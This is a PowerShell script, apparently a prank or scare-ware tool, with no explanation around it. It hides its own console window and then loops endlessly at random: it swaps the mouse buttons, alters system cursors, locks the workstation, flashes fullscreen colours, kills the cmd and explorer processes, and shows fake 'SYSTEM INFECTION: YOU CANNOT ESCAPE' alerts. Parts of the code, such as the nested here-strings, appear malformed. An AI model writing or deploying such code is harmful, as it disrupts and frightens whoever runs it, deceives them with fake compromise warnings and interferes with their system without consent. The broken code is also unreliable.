Add-Type -AssemblyName "System.Windows.Forms"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class HiddenWindow {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    public static void Hide() {
        IntPtr hWnd = GetConsoleWindow();
        ShowWindow(hWnd, 0);
    }
}
"@
[HiddenWindow]::Hide()

function Random-ScreenEffects {
    $effects = @(
        { 
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class SystemSounds {
                [DllImport("user32.dll")]
                public static extern int MessageBeep(uint uType);
            }
            "@
            [SystemSounds]::MessageBeep(0)
        },
        { 
            $cmd = "rundll32 user32.dll,SwapMouseButton"
            Invoke-Expression $cmd
        },
        { 
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class CursorChanger {
                [DllImport("user32.dll")]
                public static extern bool SetSystemCursor(IntPtr hCursor, uint nIndex);
            }
            "@
            $cursor = [System.IntPtr]::Zero
            [CursorChanger]::SetSystemCursor($cursor, 0x0001)
        },
        {
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class ScreenBlaster {
                [DllImport("user32.dll")]
                public static extern bool LockWorkStation();
            }
            "@
            [ScreenBlaster]::LockWorkStation()
        }
    )
    $randomEffect = $effects | Get-Random
    $randomEffect.Invoke()
}

function FlashScreen {
    $flashColors = @("Red", "Blue", "Green", "Yellow", "Pink")
    $randomColor = $flashColors | Get-Random
    $flashScript = @"
    Add-Type -TypeDefinition @"
    using System;
    using System.Drawing;
    using System.Windows.Forms;
    public class FlashWindow {
        public static void Flash() {
            Form flashForm = new Form();
            flashForm.WindowState = FormWindowState.Maximized;
            flashForm.BackColor = Color.$randomColor;
            flashForm.TopMost = true;
            flashForm.Show();
            flashForm.Visible = true;
            System.Threading.Thread.Sleep(500);
            flashForm.Visible = false;
        }
    }
    "@
    Invoke-Expression $flashScript
}

function Random-Madness {
    $madnessActions = @(
        { FlashScreen; Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5) },
        { Random-ScreenEffects; Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3) },
        { 
            Start-Process "cmd"
            Start-Sleep -Seconds 2
            $cmdProcess = Get-Process cmd
            $cmdProcess.Kill()
        },
        { 
            [console]::beep(700, 2000)
            Start-Sleep -Seconds 1
            [console]::beep(1200, 100)
        }
    )
    $madAction = $madnessActions | Get-Random
    $madAction.Invoke()
}

function Trigger-FinalPhase {
    $finalPhaseActions = @(
        { 
            [System.Windows.Forms.MessageBox]::Show("SYSTEM INFECTION: YOU CANNOT ESCAPE.", "ERROR: FULL SYSTEM COMPROMISED", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Critical)
            Start-Sleep -Seconds 1
        },
        { 
            Start-Process "explorer.exe"
            Start-Sleep -Seconds 1
            $explorerProcess = Get-Process explorer
            $explorerProcess.Kill()
        },
        {
            [System.Windows.Forms.MessageBox]::Show("This is it. It's over.", "GOODBYE.", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        }
    )
    $randomFinalAction = $finalPhaseActions | Get-Random
    $randomFinalAction.Invoke()
}

function Kill-Switch {
    $key = [System.Windows.Forms.Keys]::Control | [System.Windows.Forms.Keys]::Shift | [System.Windows.Forms.Keys]::K
    $keyListener = New-Object System.Windows.Forms.Form
    $keyListener.KeyPreview = $true
    $keyListener.Add_KeyDown({
        if ($_.Control -and $_.Shift -and $_.KeyCode -eq [System.Windows.Forms.Keys]::K) {
            $keyListener.Close()
            exit
        }
    })
    $keyListener.ShowDialog()
}

Start-Job { Kill-Switch }

while ($true) {
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
    Random-Madness
    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
    Trigger-FinalPhase
}
